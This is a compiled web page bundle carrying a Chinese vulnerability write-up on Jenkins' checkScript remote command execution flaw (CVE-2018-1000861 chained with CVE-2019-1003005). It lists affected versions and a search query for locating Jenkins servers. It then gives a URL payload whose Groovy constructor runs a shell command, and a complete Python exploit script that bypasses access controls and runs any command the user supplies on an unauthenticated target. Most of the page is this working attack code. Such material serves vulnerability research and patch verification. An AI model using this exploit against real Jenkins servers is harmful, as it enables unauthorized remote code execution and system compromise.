import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e}from"./app-58e4a7d6.js";const p={},t=e(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。</p><p>通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Jenkins version &lt; 2.138
Jenkins build time &lt; 2019-01-28
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Jenkins&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251630920.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>使用 EXP 执行命令</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript
?sandbox=true
&amp;value=public class x {
  public x(){
    &quot;touch /tmp/success&quot;.execute()
  }
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251630302.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功创建<code>/tmp/success</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205251631975.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python</span>
<span class="token comment"># coding: UTF-8</span>
<span class="token comment"># author: Orange Tsai(@orange_8361)</span>
<span class="token comment"># </span>

<span class="token keyword">import</span> sys
<span class="token keyword">import</span> requests
<span class="token keyword">from</span> enum <span class="token keyword">import</span> Enum

<span class="token comment"># remove bad SSL warnings</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>


endpoint <span class="token operator">=</span> <span class="token string">&#39;descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript&#39;</span>

<span class="token keyword">class</span> <span class="token class-name">mode</span><span class="token punctuation">(</span>Enum<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ACL_PATCHED <span class="token operator">=</span> <span class="token number">0</span>
    NOT_JENKINS <span class="token operator">=</span> <span class="token number">1</span>
    READ_ENABLE <span class="token operator">=</span> <span class="token number">2</span>
    READ_BYPASS <span class="token operator">=</span> <span class="token number">3</span>
    ENTRY_NOTFOUND <span class="token operator">=</span> <span class="token number">999</span>

<span class="token keyword">def</span> <span class="token function">usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> <span class="token triple-quoted-string string">&#39;&#39;&#39;
  Usage:
    python exp.py &lt;url&gt; &lt;cmd&gt;
    &#39;&#39;&#39;</span>

<span class="token keyword">def</span> <span class="token function">_log</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> fail<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    nb <span class="token operator">=</span> <span class="token string">&#39;[*]&#39;</span>
    <span class="token keyword">if</span> fail<span class="token punctuation">:</span>
        nb <span class="token operator">=</span> <span class="token string">&#39;[-]&#39;</span>
    <span class="token keyword">print</span> <span class="token string">&#39;%s %s&#39;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>nb<span class="token punctuation">,</span> msg<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">_get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>
    <span class="token keyword">return</span> r<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span> r<span class="token punctuation">.</span>content

<span class="token keyword">def</span> <span class="token function">_add_bypass</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> url <span class="token operator">+</span> <span class="token string">&#39;securityRealm/user/admin/&#39;</span>

<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag<span class="token punctuation">,</span> accessible <span class="token operator">=</span> mode<span class="token punctuation">.</span>ACL_PATCHED<span class="token punctuation">,</span> <span class="token boolean">False</span>

    <span class="token comment"># check ANONYMOUS_READ</span>
    status<span class="token punctuation">,</span> content <span class="token operator">=</span> _get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">if</span> status <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> <span class="token string">&#39;adjuncts&#39;</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
        flag<span class="token punctuation">,</span> accessible <span class="token operator">=</span> mode<span class="token punctuation">.</span>READ_ENABLE<span class="token punctuation">,</span> <span class="token boolean">True</span>
        _log<span class="token punctuation">(</span><span class="token string">&#39;ANONYMOUS_READ enable!&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> status <span class="token operator">==</span> <span class="token number">403</span><span class="token punctuation">:</span>
        _log<span class="token punctuation">(</span><span class="token string">&#39;ANONYMOUS_READ disable!&#39;</span><span class="token punctuation">)</span>

        <span class="token comment"># check ACL bypass, CVE-2018-1000861</span>
        status<span class="token punctuation">,</span> content <span class="token operator">=</span> _get<span class="token punctuation">(</span>_add_bypass<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> status <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> <span class="token string">&#39;adjuncts&#39;</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
            flag<span class="token punctuation">,</span> accessible <span class="token operator">=</span> mode<span class="token punctuation">.</span>READ_BYPASS<span class="token punctuation">,</span> <span class="token boolean">True</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        flag <span class="token operator">=</span> mode<span class="token punctuation">.</span>NOT_JENKINS

    <span class="token comment"># check entry point, CVE-2019-1003005</span>
    <span class="token keyword">if</span> accessible<span class="token punctuation">:</span>
        <span class="token keyword">if</span> flag <span class="token keyword">is</span> mode<span class="token punctuation">.</span>READ_BYPASS<span class="token punctuation">:</span>
            url <span class="token operator">=</span> _add_bypass<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
        status<span class="token punctuation">,</span> content <span class="token operator">=</span> _get<span class="token punctuation">(</span>url <span class="token operator">+</span> endpoint<span class="token punctuation">)</span>

        <span class="token keyword">if</span> status <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">:</span>
            flag <span class="token operator">=</span> mode<span class="token punctuation">.</span>ENTRY_NOTFOUND

    <span class="token keyword">return</span> flag

<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string">&#39;public class x{public x(){new String(&quot;%s&quot;.decodeHex()).execute()}}&#39;</span> <span class="token operator">%</span> cmd<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;hex&#39;</span><span class="token punctuation">)</span>
    params <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;sandbox&#39;</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span> 
        <span class="token string">&#39;value&#39;</span><span class="token punctuation">:</span> payload
    <span class="token punctuation">}</span>

    status<span class="token punctuation">,</span> content <span class="token operator">=</span> _get<span class="token punctuation">(</span>url <span class="token operator">+</span> endpoint<span class="token punctuation">,</span> params<span class="token punctuation">)</span>
    <span class="token keyword">if</span> status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
        _log<span class="token punctuation">(</span><span class="token string">&#39;Exploit success!(it should be :P)&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> status <span class="token operator">==</span> <span class="token number">405</span><span class="token punctuation">:</span>
        _log<span class="token punctuation">(</span><span class="token string">&#39;It seems Jenkins has patched the RCE gadget :(&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        _log<span class="token punctuation">(</span><span class="token string">&#39;Exploit fail with HTTP status [%d]&#39;</span> <span class="token operator">%</span> status<span class="token punctuation">,</span> fail<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">&#39;stack trace&#39;</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
            <span class="token keyword">for</span> _ <span class="token keyword">in</span> content<span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> _<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">&#39;Caused:&#39;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    _log<span class="token punctuation">(</span>_<span class="token punctuation">,</span> fail<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>
        usage<span class="token punctuation">(</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

    url <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&#39;/&#39;</span>
    cmd <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>

    flag <span class="token operator">=</span> check<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
    <span class="token keyword">if</span> flag <span class="token keyword">is</span> mode<span class="token punctuation">.</span>ACL_PATCHED<span class="token punctuation">:</span>
        _log<span class="token punctuation">(</span><span class="token string">&#39;It seems Jenkins is up-to-date(&gt;2.137) :(&#39;</span><span class="token punctuation">,</span> fail<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> flag <span class="token keyword">is</span> mode<span class="token punctuation">.</span>NOT_JENKINS<span class="token punctuation">:</span>
        _log<span class="token punctuation">(</span><span class="token string">&#39;Is this Jenkins?&#39;</span><span class="token punctuation">,</span> fail<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> flag <span class="token keyword">is</span> mode<span class="token punctuation">.</span>READ_ENABLE<span class="token punctuation">:</span>
        exploit<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> flag <span class="token keyword">is</span> mode<span class="token punctuation">.</span>READ_BYPASS<span class="token punctuation">:</span>
        _log<span class="token punctuation">(</span><span class="token string">&#39;Bypass with CVE-2018-1000861!&#39;</span><span class="token punctuation">)</span>
        exploit<span class="token punctuation">(</span>_add_bypass<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        _log<span class="token punctuation">(</span><span class="token string">&#39;The \`checkScript\` is not found, please try other entries(see refs)&#39;</span><span class="token punctuation">,</span> fail<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,17),o=[t];function c(i,l){return s(),a("div",null,o)}const d=n(p,[["render",c],["__file","Jenkins checkScript 远程命令执行漏洞 CVE-2018-1000861.html.vue"]]);export{d as default};
